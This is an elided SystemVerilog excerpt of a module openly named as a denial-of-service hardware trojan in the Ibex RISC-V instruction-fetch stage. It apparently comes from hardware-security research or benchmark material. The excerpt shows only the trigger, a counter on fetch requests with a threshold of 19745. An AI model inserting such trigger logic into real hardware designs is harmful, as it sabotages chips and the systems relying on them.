...
module ibex_if_stage_trojan_DoS import ibex_pkg::*; #(
  ...
  output logic                        if_busy_o                 // IF stage is busy fetching instr
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=19745)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19745;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (req_i) trojan_counter <= trojan_counter + 1;
